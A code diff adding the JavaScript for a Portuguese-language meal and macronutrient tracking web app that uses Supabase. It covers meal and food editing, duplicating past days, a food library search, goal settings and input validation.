+      card.innerHTML = `
+        <div class="meal-card-header">
+          <div class="meal-info">
+            <div class="meal-icon">${escapeHTML(meal.emoji)}</div>
+            <div>
+              <div class="meal-name">${escapeHTML(meal.name)}</div>
+              <div class="meal-time">${escapeHTML(meal.time)}</div>
+            </div>
+          </div>
+          <div class="meal-summary">
+            <span class="meal-kcal">${mealKcal} kcal</span>
+            <div class="meal-actions">
+              <button class="meal-action-btn" onclick="event.stopPropagation(); openEditMealModal('${escapeHTML(meal.id)}')" title="Editar refeição">✎</button>
+              <button class="meal-action-btn delete" onclick="event.stopPropagation(); deleteMeal('${escapeHTML(meal.id)}')" title="Excluir refeição">✕</button>
+            </div>
+            <span class="meal-chevron">▼</span>
+          </div>
+        </div>
+        <div class="meal-body">
+          <div class="food-table-header">
+            <span>Alimento</span>
+            <span>Qtd</span>
+            <span>Kcal</span>
+            <span>Prot</span>
+            <span>Carb</span>
+            <span class="col-fat">Gord</span>
+          </div>
+          ${meal.foods.map(food => `
+            <div class="food-row" data-food-id="${escapeHTML(food.id)}" onclick="openEditQtyModal('${escapeHTML(meal.id)}','${escapeHTML(food.id)}')" title="Clique para editar quantidade">
+              <span class="food-name">${escapeHTML(food.name)}</span>
+              <span class="food-val">${food.qty}g</span>
+              <span class="food-kcal">${Math.round(calcMacro(food.kcalPer100, food.qty))}</span>
+              <span class="food-val">${calcMacro(food.protPer100, food.qty)}g</span>
+              <span class="food-val">${calcMacro(food.carbPer100, food.qty)}g</span>
+              <span class="food-val col-fat">${calcMacro(food.fatPer100, food.qty)}g</span>
+              <button class="food-delete-btn" onclick="event.stopPropagation(); deleteFood('${escapeHTML(meal.id)}','${escapeHTML(food.id)}')">✕</button>
+            </div>
+          `).join('')}
+          <div class="add-food-area">
+            <button class="btn-add-food" onclick="openFoodModal('${escapeHTML(meal.id)}')">+ Adicionar alimento</button>
+          </div>
+        </div>
+      `;
+      card.querySelector('.meal-card-header').addEventListener('click', () => {
+        card.classList.toggle('expanded');
+      });
+      return card;
+    }
+
+    /* =====================================================================
+       AÇÕES
+    ===================================================================== */
+    async function addMeal(name, emoji, time) {
+      ensureDay(currentDate);
+      const newMeal = { id: crypto.randomUUID(), name, emoji, time: time || '--:--', foods: [] };
+      allData[currentDate].meals.push(newMeal);
+      render();
+      showToast(`Refeição "${name}" criada`);
+      await saveMealToCloud(newMeal);
+    }
+
+    async function addFood(mealId, food) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+
+      const newFood = { id: crypto.randomUUID(), ...food };
+      meal.foods.push(newFood);
+      render();
+      setTimeout(() => {
+        const card = document.querySelector(`.meal-card[data-id="${mealId}"]`);
+        if (card) card.classList.add('expanded');
+      }, 0);
+      showToast(`"${food.name}" adicionado`);
+
+      // Salva no Supabase em paralelo
+      await saveFoodToCloud(mealId, newFood);
+      await upsertLibraryFood(food);
+      renderLibraryCount();
+    }
+
+    async function deleteFood(mealId, foodId) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+      meal.foods = meal.foods.filter(f => f.id !== foodId);
+      render();
+      showToast('Alimento removido');
+      await deleteFoodFromCloud(foodId);
+    }
+
+    async function updateFoodQty(mealId, foodId, newQty) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+      const food = meal.foods.find(f => f.id === foodId);
+      if (!food) return;
+      food.qty = newQty;
+      render();
+      showToast('Quantidade atualizada');
+      await updateFoodQtyInCloud(foodId, newQty);
+    }
+
+    /* =====================================================================
+       EXCLUIR REFEIÇÃO INTEIRA
+       Deleta a refeição e todos os seus alimentos do Supabase.
+       O ON DELETE CASCADE na tabela meal_foods cuida de apagar
+       os alimentos automaticamente quando a refeição é deletada.
+    ===================================================================== */
+    async function deleteMeal(mealId) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+      if (!confirm(`Excluir "${meal.name}" e todos os alimentos?\n\nEssa ação não pode ser desfeita.`)) return;
+
+      allData[currentDate].meals = getMeals().filter(m => m.id !== mealId);
+      render();
+      showToast(`"${meal.name}" excluída`);
+      await sb.from('meals').delete().eq('id', mealId);
+    }
+
+    /* =====================================================================
+       EDITAR REFEIÇÃO (nome/tipo e horário)
+    ===================================================================== */
+    let editingMealRef = null; // referência à refeição sendo editada
+    let editMealType   = '';
+    let editMealEmoji  = '';
+
+    function openEditMealModal(mealId) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+      editingMealRef = meal;
+      editMealType   = meal.name;
+      editMealEmoji  = meal.emoji;
+
+      // Seleciona o tipo correto no grid
+      document.querySelectorAll('#edit-meal-type-grid .meal-type-option').forEach(opt => {
+        opt.classList.toggle('selected', opt.dataset.type === meal.name);
+      });
+      document.getElementById('edit-meal-time').value = meal.time !== '--:--' ? meal.time : '';
+      document.getElementById('modal-edit-meal').classList.add('active');
+    }
+
+    function closeEditMealModal() {
+      document.getElementById('modal-edit-meal').classList.remove('active');
+      editingMealRef = null;
+    }
+
+    async function saveEditMeal() {
+      if (!editingMealRef) return;
+      const time = document.getElementById('edit-meal-time').value || '--:--';
+
+      editingMealRef.name  = editMealType;
+      editingMealRef.emoji = editMealEmoji;
+      editingMealRef.time  = time;
+
+      render();
+      closeEditMealModal();
+      showToast('Refeição atualizada');
+
+      await sb.from('meals').update({
+        name:  editMealType,
+        emoji: editMealEmoji,
+        time:  time,
+      }).eq('id', editingMealRef.id);
+    }
+
+    /* =====================================================================
+       DUPLICAR REFEIÇÕES DE OUTRO DIA
+       Busca os últimos 7 dias que tiveram refeições e permite
+       copiar tudo para o dia atual.
+    ===================================================================== */
+    async function openDuplicateModal() {
+      document.getElementById('modal-duplicate').classList.add('active');
+      const listEl = document.getElementById('duplicate-day-list');
+      listEl.innerHTML = '<div style="text-align:center;color:var(--text-muted);padding:20px;font-size:13px;">Carregando...</div>';
+
+      // Busca os últimos dias com refeições (excluindo hoje)
+      const { data: recentMeals } = await sb
+        .from('meals')
+        .select('date')
+        .eq('user_id', currentUser.id)
+        .neq('date', currentDate)
+        .order('date', { ascending: false })
+        .limit(50);
+
+      if (!recentMeals || recentMeals.length === 0) {
+        listEl.innerHTML = '<div style="text-align:center;color:var(--text-muted);padding:20px;font-size:13px;">Nenhum dia anterior com refeições encontrado.</div>';
+        return;
+      }
+
+      // Agrupa por data e pega os últimos 7 dias únicos
+      const dateMap = {};
+      recentMeals.forEach(m => {
+        dateMap[m.date] = (dateMap[m.date] || 0) + 1;
+      });
+      const uniqueDates = Object.keys(dateMap).slice(0, 7);
+
+      listEl.innerHTML = uniqueDates.map(date => {
+        const longDate = formatDateLong(date);
+        const label = longDate.charAt(0).toUpperCase() + longDate.slice(1);
+        return `
+          <div class="duplicate-day-item" onclick="executeDuplicate('${escapeHTML(date)}')">
+            <span class="duplicate-day-date">${escapeHTML(label)}</span>
+            <span class="duplicate-day-info">${dateMap[date]} refeição(ões)</span>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function closeDuplicateModal() {
+      document.getElementById('modal-duplicate').classList.remove('active');
+    }
+
+    async function executeDuplicate(sourceDate) {
+      closeDuplicateModal();
+      showToast('Copiando refeições...');
+
+      // Carrega o dia fonte completo
+      const sourceDay = await loadDayFromCloud(sourceDate);
+      if (!sourceDay.meals || sourceDay.meals.length === 0) {
+        showToast('Dia sem refeições');
+        return;
+      }
+
+      // Copia cada refeição e seus alimentos para hoje
+      for (const meal of sourceDay.meals) {
+        const newMealId = crypto.randomUUID();
+        const newMeal = {
+          id:    newMealId,
+          name:  meal.name,
+          emoji: meal.emoji,
+          time:  meal.time,
+          foods: [],
+        };
+
+        // Salva a refeição no banco
+        await sb.from('meals').insert({
+          id:         newMealId,
+          user_id:    currentUser.id,
+          name:       meal.name,
+          emoji:      meal.emoji,
+          time:       meal.time,
+          date:       currentDate,
+          sort_order: getMeals().length,
+        });
+
+        // Copia os alimentos
+        for (const food of meal.foods) {
+          const newFoodId = crypto.randomUUID();
+          await sb.from('meal_foods').insert({
+            id:          newFoodId,
+            meal_id:     newMealId,
+            user_id:     currentUser.id,
+            name:        food.name,
+            qty:         food.qty,
+            kcal_per100: food.kcalPer100,
+            prot_per100: food.protPer100,
+            carb_per100: food.carbPer100,
+            fat_per100:  food.fatPer100,
+          });
+          newMeal.foods.push({ id: newFoodId, ...food });
+        }
+
+        ensureDay(currentDate);
+        allData[currentDate].meals.push(newMeal);
+      }
+
+      render();
+      showToast(`${sourceDay.meals.length} refeição(ões) copiadas!`);
+    }
+
+    /* =====================================================================
+       MODAL DE REFEIÇÃO
+    ===================================================================== */
+    function openMealModal() {
+      const now = new Date();
+      const hh  = String(now.getHours()).padStart(2, '0');
+      const mm  = String(now.getMinutes()).padStart(2, '0');
+      document.getElementById('meal-time-input').value = `${hh}:${mm}`;
+      document.getElementById('modal-meal').classList.add('active');
+    }
+    function closeMealModal() {
+      document.getElementById('modal-meal').classList.remove('active');
+    }
+
+    /* =====================================================================
+       MODAL DE EDITAR QUANTIDADE
+
+       Variáveis de estado do modal:
+       - editingMealId / editingFoodId: identificam qual alimento está
+         sendo editado. Guardamos em variáveis globais porque o
+         clique do botão "Salvar" precisa saber qual alimento atualizar.
+    ===================================================================== */
+    let editingMealId = null;
+    let editingFoodId = null;
+
+    function openEditQtyModal(mealId, foodId) {
+      const meal = getMeals().find(m => m.id === mealId);
+      if (!meal) return;
+      const food = meal.foods.find(f => f.id === foodId);
+      if (!food) return;
+
+      // Guarda referência para usar quando clicar em Salvar
+      editingMealId = mealId;
+      editingFoodId = foodId;
+
+      // Preenche o modal com os dados atuais
+      document.getElementById('edit-qty-food-name').textContent = food.name;
+      document.getElementById('edit-qty-current-macros').textContent =
+        `Atual: ${food.qty}g · ${Math.round(calcMacro(food.kcalPer100, food.qty))} kcal · ` +
+        `P${calcMacro(food.protPer100, food.qty)}g · C${calcMacro(food.carbPer100, food.qty)}g · ` +
+        `G${calcMacro(food.fatPer100, food.qty)}g`;
+
+      const qtyInput = document.getElementById('edit-qty-input');
+      qtyInput.value = food.qty;
+
+      // Esconde o preview até o usuário começar a digitar
+      document.getElementById('edit-qty-preview').style.display = 'none';
+
+      document.getElementById('modal-edit-qty').classList.add('active');
+
+      // Foca no input e seleciona o valor (facilita edição)
+      setTimeout(() => { qtyInput.focus(); qtyInput.select(); }, 100);
+    }
+
+    function closeEditQtyModal() {
+      document.getElementById('modal-edit-qty').classList.remove('active');
+      editingMealId = null;
+      editingFoodId = null;
+    }
+
+    /*
+       Calcula um preview dos novos macros enquanto o usuário digita.
+       Mostra ao vivo como ficará a nova quantidade.
+    */
+    function updateEditQtyPreview() {
+      if (!editingMealId || !editingFoodId) return;
+
+      const meal = getMeals().find(m => m.id === editingMealId);
+      if (!meal) return;
+      const food = meal.foods.find(f => f.id === editingFoodId);
+      if (!food) return;
+
+      const newQty = parseFloat(document.getElementById('edit-qty-input').value) || 0;
+      const preview = document.getElementById('edit-qty-preview');
+
+      if (newQty <= 0) {
+        preview.style.display = 'none';
+        return;
+      }
+
+      preview.style.display = 'block';
+      preview.textContent =
+        `Novo: ${newQty}g · ${Math.round(calcMacro(food.kcalPer100, newQty))} kcal · ` +
+        `P${calcMacro(food.protPer100, newQty)}g · C${calcMacro(food.carbPer100, newQty)}g · ` +
+        `G${calcMacro(food.fatPer100, newQty)}g`;
+    }
+
+    /* =====================================================================
+       MODAL DE ALIMENTO — com lógica da biblioteca
+
+       Aqui entra o conceito de "estado interno do modal":
+       - selectedLibraryFood = null  → modo cadastro manual
+       - selectedLibraryFood = {...} → modo biblioteca (macros preenchidos)
+    ===================================================================== */
+    function openFoodModal(mealId) {
+      activeMealId = mealId;
+      selectedLibraryFood = null;
+
+      // Limpa todos os campos
+      document.getElementById('food-search-input').value = '';
+      document.getElementById('food-name-input').value   = '';
+      document.getElementById('food-qty-input').value    = '';
+      document.getElementById('food-kcal-input').value   = '';
+      document.getElementById('food-prot-input').value   = '';
+      document.getElementById('food-carb-input').value   = '';
+      document.getElementById('food-fat-input').value    = '';
+
+      // Garante que começa no modo "manual"
+      setLibrarySelectionMode(false);
+
+      document.getElementById('food-suggestions').classList.remove('visible');
+      document.getElementById('food-suggestions').innerHTML = '';
+      document.getElementById('modal-food').classList.add('active');
+      setTimeout(() => document.getElementById('food-search-input').focus(), 100);
+    }
+
+    function closeFoodModal() {
+      document.getElementById('modal-food').classList.remove('active');
+      activeMealId = null;
+      selectedLibraryFood = null;
+    }
+
+    /*
+       Alterna entre "modo biblioteca" e "modo manual".
+
+       Quando isSelected = true:
+       - Mostra o indicador com o nome do alimento selecionado
+       - Bloqueia os campos de macro (já preenchidos)
+       - Esconde o campo de nome (não precisa digitar)
+
+       Quando isSelected = false:
+       - Esconde o indicador
+       - Desbloqueia os campos de macro
+       - Mostra o campo de nome
+    */
+    function setLibrarySelectionMode(isSelected) {
+      const indicator   = document.getElementById('selected-food-indicator');
+      const nameGroup   = document.getElementById('food-name-group');
+      const macroFields = document.getElementById('macro-fields');
+      const divider     = document.getElementById('food-divider');
+      const dividerText = document.getElementById('divider-text');
+
+      if (isSelected) {
+        indicator.classList.add('visible');
+        nameGroup.style.display   = 'none';
+        macroFields.classList.add('locked');
+        dividerText.textContent   = 'macros preenchidos automaticamente';
+      } else {
+        indicator.classList.remove('visible');
+        nameGroup.style.display   = 'block';
+        macroFields.classList.remove('locked');
+        dividerText.textContent   = 'ou cadastre um novo';
+      }
+    }
+
+    /*
+       Seleciona um alimento da biblioteca.
+       Preenche os campos de macro automaticamente.
+    */
+    function selectLibraryFood(food) {
+      selectedLibraryFood = food;
+
+      // Preenche os campos com os dados da biblioteca
+      document.getElementById('food-kcal-input').value = food.kcalPer100;
+      document.getElementById('food-prot-input').value = food.protPer100;
+      document.getElementById('food-carb-input').value = food.carbPer100;
+      document.getElementById('food-fat-input').value  = food.fatPer100;
+
+      // Mostra o nome selecionado no indicador
+      document.getElementById('selected-food-name').textContent = food.name;
+
+      // Ativa o modo biblioteca
+      setLibrarySelectionMode(true);
+
+      // Esconde as sugestões
+      document.getElementById('food-suggestions').classList.remove('visible');
+      document.getElementById('food-search-input').value = '';
+
+      // Foca na quantidade
+      document.getElementById('food-qty-input').focus();
+    }
+
+    /*
+       Renderiza a lista de sugestões no modal.
+       Chamada toda vez que o usuário digita no campo de busca.
+    */
+    function renderSuggestions(query) {
+      const suggestionsEl = document.getElementById('food-suggestions');
+      const results = searchLibrary(query);
+
+      if (results.length === 0) {
+        suggestionsEl.classList.remove('visible');
+        suggestionsEl.innerHTML = '';
+        return;
+      }
+
+      /*
+         Cada sugestão agora tem 2 áreas clicáveis:
+         - O bloco principal (.suggestion-content) — clique seleciona o alimento
+         - O botão de excluir (.suggestion-delete-btn) — apaga da biblioteca
+
+         Usamos event.stopPropagation() no botão para evitar que o clique
+         no botão também ative o clique do bloco principal (event bubbling).
+      */
+      suggestionsEl.innerHTML = results.map(food => `
+        <div class="food-suggestion-item" data-food-id="${escapeHTML(food.id)}">
+          <div class="suggestion-content">
+            <span class="suggestion-name">${escapeHTML(food.name)}</span>
+            <span class="suggestion-macros">
+              ${food.kcalPer100} kcal · P${food.protPer100} C${food.carbPer100} G${food.fatPer100}
+            </span>
+          </div>
+          <button class="suggestion-delete-btn" data-food-id="${escapeHTML(food.id)}" title="Remover da biblioteca">✕</button>
+        </div>
+      `).join('');
+
+      suggestionsEl.classList.add('visible');
+
+      // Clique no conteúdo → seleciona o alimento
+      suggestionsEl.querySelectorAll('.suggestion-content').forEach(content => {
+        content.addEventListener('click', () => {
+          const foodId = content.parentElement.dataset.foodId;
+          const food   = results.find(f => f.id === foodId);
+          if (food) selectLibraryFood(food);
+        });
+      });
+
+      // Clique no X → remove da biblioteca
+      suggestionsEl.querySelectorAll('.suggestion-delete-btn').forEach(btn => {
+        btn.addEventListener('click', e => {
+          e.stopPropagation();  // evita disparar o clique do conteúdo
+          const foodId = btn.dataset.foodId;
+          const food   = results.find(f => f.id === foodId);
+          if (!food) return;
+
+          // Pede confirmação antes de excluir
+          if (!confirm(`Remover "${food.name}" da biblioteca?\n\n(suas refeições antigas continuam intactas)`)) return;
+
+          deleteLibraryFood(foodId);
+          renderSuggestions(query);  // re-renderiza a lista sem o item
+          renderLibraryCount();      // atualiza contador no header
+          showToast(`"${food.name}" removido da biblioteca`);
+        });
+      });
+    }
+
+    /* =====================================================================
+       TOAST
+    ===================================================================== */
+    /* =====================================================================
+       MODAL DE OBJETIVOS
+       Abre com os valores atuais preenchidos. Ao salvar, persiste no
+       localStorage e re-renderiza os cards para refletir as novas metas.
+    ===================================================================== */
+    function openGoalsModal() {
+      document.getElementById('goal-kcal-input').value = goals.kcal;
+      document.getElementById('goal-prot-input').value = goals.prot;
+      document.getElementById('goal-carb-input').value = goals.carb;
+      document.getElementById('goal-fat-input').value  = goals.fat;
+      document.getElementById('modal-goals').classList.add('active');
+    }
+
+    function closeGoalsModal() {
+      document.getElementById('modal-goals').classList.remove('active');
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      toast.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    /* =====================================================================
+       EVENT LISTENERS
+    ===================================================================== */
+
+    // Navegação de datas — lock impede race condition ao clicar rápido
+    let isLoadingDate = false;
+    async function navigateDate(delta) {
+      if (isLoadingDate) return;
+      const newDate = offsetDate(currentDate, delta);
+      if (delta > 0 && newDate > getTodayStr()) return;
+      isLoadingDate = true;
+      document.getElementById('btn-prev-day').disabled = true;
+      document.getElementById('btn-next-day').disabled = true;
+      currentDate = newDate;
+      await loadDiaryData();
+      render();
+      isLoadingDate = false;
+    }
+    document.getElementById('btn-prev-day').addEventListener('click', () => navigateDate(-1));
+    document.getElementById('btn-next-day').addEventListener('click', () => navigateDate(+1));
+
+    // Modal de refeição
+    document.getElementById('btn-open-meal-modal').addEventListener('click', openMealModal);
+    document.getElementById('btn-cancel-meal').addEventListener('click', closeMealModal);
+
+    // Modal de editar refeição
+    document.getElementById('btn-cancel-edit-meal').addEventListener('click', closeEditMealModal);
+    document.getElementById('btn-confirm-edit-meal').addEventListener('click', () => saveEditMeal());
+    document.getElementById('edit-meal-type-grid').addEventListener('click', e => {
+      const option = e.target.closest('.meal-type-option');
+      if (!option) return;
+      document.querySelectorAll('#edit-meal-type-grid .meal-type-option').forEach(o => o.classList.remove('selected'));
+      option.classList.add('selected');
+      editMealType  = option.dataset.type;
+      editMealEmoji = option.dataset.emoji;
+    });
+
+    // Modal de duplicar dia
+    document.getElementById('btn-duplicate-day').addEventListener('click', () => openDuplicateModal());
+    document.getElementById('btn-cancel-duplicate').addEventListener('click', closeDuplicateModal);
+
+    // Modal de objetivos
+    document.getElementById('btn-open-goals').addEventListener('click', openGoalsModal);
+    document.getElementById('btn-cancel-goals').addEventListener('click', closeGoalsModal);
+    document.getElementById('btn-confirm-goals').addEventListener('click', async () => {
+      goals.kcal = parseFloat(document.getElementById('goal-kcal-input').value) || 0;
+      goals.prot = parseFloat(document.getElementById('goal-prot-input').value) || 0;
+      goals.carb = parseFloat(document.getElementById('goal-carb-input').value) || 0;
+      goals.fat  = parseFloat(document.getElementById('goal-fat-input').value)  || 0;
+      await saveGoals();
+      render();
+      closeGoalsModal();
+      showToast('Objetivos atualizados');
+    });
+    document.getElementById('meal-type-grid').addEventListener('click', e => {
+      const option = e.target.closest('.meal-type-option');
+      if (!option) return;
+      // escopo restrito ao grid correto — evita desselecionar o grid do modal de edição
+      document.querySelectorAll('#meal-type-grid .meal-type-option').forEach(o => o.classList.remove('selected'));
+      option.classList.add('selected');
+      selectedMealType  = option.dataset.type;
+      selectedMealEmoji = option.dataset.emoji;
+    });
+    document.getElementById('btn-confirm-meal').addEventListener('click', () => {
+      const time = document.getElementById('meal-time-input').value;
+      addMeal(selectedMealType, selectedMealEmoji, time);
+      closeMealModal();
+    });
+
+    // Modal de alimento
+    document.getElementById('btn-cancel-food').addEventListener('click', closeFoodModal);
+
+    // Limpar seleção da biblioteca
+    document.getElementById('btn-clear-selection').addEventListener('click', () => {
+      selectedLibraryFood = null;
+      setLibrarySelectionMode(false);
+      // Limpa os campos de macro
+      ['food-kcal-input','food-prot-input','food-carb-input','food-fat-input'].forEach(id => {
+        document.getElementById(id).value = '';
+      });
+      document.getElementById('food-search-input').focus();
+    });
+
+    /*
+       BUSCA EM TEMPO REAL — evento 'input'
+       O evento 'input' dispara toda vez que o valor do campo muda
+       (diferente de 'change' que só dispara ao sair do campo).
+       Isso permite buscar enquanto o usuário digita, letra por letra.
+    */
+    document.getElementById('food-search-input').addEventListener('input', e => {
+      const query = e.target.value.trim();
+      if (query.length >= 1) {
+        renderSuggestions(query);
+      } else {
+        document.getElementById('food-suggestions').classList.remove('visible');
+      }
+    });
+
+    // Confirmar adição de alimento
+    document.getElementById('btn-confirm-food').addEventListener('click', () => {
+      const qty = parseFloat(document.getElementById('food-qty-input').value) || 0;
+
+      if (qty <= 0) {
+        document.getElementById('food-qty-input').focus();
+        showToast('Digite a quantidade em gramas');
+        return;
+      }
+
+      /*
+         VALIDAÇÃO DE INPUTS — proteção contra dados corrompidos
+
+         Limites razoáveis:
+         - Quantidade: máx 10.000g (10kg — ninguém come mais que isso de uma vez)
+         - Calorias: máx 900 kcal/100g (gordura pura ≈ 900 kcal/100g)
+         - Macros: máx 100g por 100g (impossível ter mais que 100%)
+         - Nome: máx 100 caracteres
+         - Valores negativos: convertidos para 0
+
+         Esses limites não impedem o uso normal mas barram valores
+         absurdos que poderiam corromper gráficos e totais.
+      */
+      const MAX_QTY  = 10000;
+      const MAX_KCAL = 900;
+      const MAX_MACRO = 100;
+      const MAX_NAME_LEN = 100;
+
+      if (qty > MAX_QTY) {
+        showToast(`Quantidade máxima: ${MAX_QTY}g`);
+        document.getElementById('food-qty-input').focus();
+        return;
+      }
+
+      // Função para limitar valores numéricos
+      const clamp = (val, max) => Math.max(0, Math.min(val, max));
+
+      let foodData;
+
+      if (selectedLibraryFood) {
+        foodData = {
+          name:       selectedLibraryFood.name.slice(0, MAX_NAME_LEN),
+          qty:        clamp(qty, MAX_QTY),
+          kcalPer100: clamp(selectedLibraryFood.kcalPer100, MAX_KCAL),
+          protPer100: clamp(selectedLibraryFood.protPer100, MAX_MACRO),
+          carbPer100: clamp(selectedLibraryFood.carbPer100, MAX_MACRO),
+          fatPer100:  clamp(selectedLibraryFood.fatPer100, MAX_MACRO),
+        };
+      } else {
+        const name = document.getElementById('food-name-input').value.trim();
+        if (!name) {
+          document.getElementById('food-name-input').focus();
+          showToast('Digite o nome do alimento');
+          return;
+        }
+        if (name.length > MAX_NAME_LEN) {
+          showToast(`Nome muito longo (máx ${MAX_NAME_LEN} caracteres)`);
+          return;
+        }
+        foodData = {
+          name:       name.slice(0, MAX_NAME_LEN),
+          qty:        clamp(qty, MAX_QTY),
+          kcalPer100: clamp(parseFloat(document.getElementById('food-kcal-input').value) || 0, MAX_KCAL),
+          protPer100: clamp(parseFloat(document.getElementById('food-prot-input').value) || 0, MAX_MACRO),
+          carbPer100: clamp(parseFloat(document.getElementById('food-carb-input').value) || 0, MAX_MACRO),
+          fatPer100:  clamp(parseFloat(document.getElementById('food-fat-input').value)  || 0, MAX_MACRO),
+        };
+      }
+
+      addFood(activeMealId, foodData);
+      closeFoodModal();
+    });
+
+    // Fechar modais clicando fora
+    document.getElementById('modal-meal').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-meal')) closeMealModal();
+    });
+    document.getElementById('modal-food').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-food')) closeFoodModal();
+    });
+    document.getElementById('modal-edit-qty').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-edit-qty')) closeEditQtyModal();
+    });
+    document.getElementById('modal-goals').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-goals')) closeGoalsModal();
+    });
+    document.getElementById('modal-duplicate').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-duplicate')) closeDuplicateModal();
+    });
+    document.getElementById('modal-edit-meal').addEventListener('click', e => {
+      if (e.target === document.getElementById('modal-edit-meal')) closeEditMealModal();
+    });
+
+    // Modal de editar quantidade
+    document.getElementById('btn-cancel-edit-qty').addEventListener('click', closeEditQtyModal);
+
+    // Atualiza preview enquanto digita a nova quantidade
+    document.getElementById('edit-qty-input').addEventListener('input', updateEditQtyPreview);
+
+    // Confirmar edição de quantidade
+    document.getElementById('btn-confirm-edit-qty').addEventListener('click', () => {
+      const newQty = parseFloat(document.getElementById('edit-qty-input').value) || 0;
+      if (newQty <= 0) {
+        showToast('Digite uma quantidade válida');
+        document.getElementById('edit-qty-input').focus();
+        return;
+      }
+      if (newQty > 10000) {
+        showToast('Quantidade máxima: 10.000g');
+        document.getElementById('edit-qty-input').focus();
+        return;
+      }
+      updateFoodQty(editingMealId, editingFoodId, newQty);
+      closeEditQtyModal();
+    });
+
+    // Enter no input de quantidade salva diretamente
+    document.getElementById('edit-qty-input').addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        document.getElementById('btn-confirm-edit-qty').click();
+      }
+    });
+
+    // Tecla Escape fecha modais
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Escape') { closeMealModal(); closeFoodModal(); closeEditQtyModal(); closeGoalsModal(); closeDuplicateModal(); closeEditMealModal(); }
+    });
+
+    /* =====================================================================
+       INICIALIZAÇÃO
+       Não chamamos render() aqui — a initApp() é chamada
+       automaticamente pelo onAuthStateChange quando o login acontece.
+    ===================================================================== */
+
+    // Registra o Service Worker (PWA)
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('sw.js').catch(() => {});
+    }
+  </script>
+</body>
+</html>
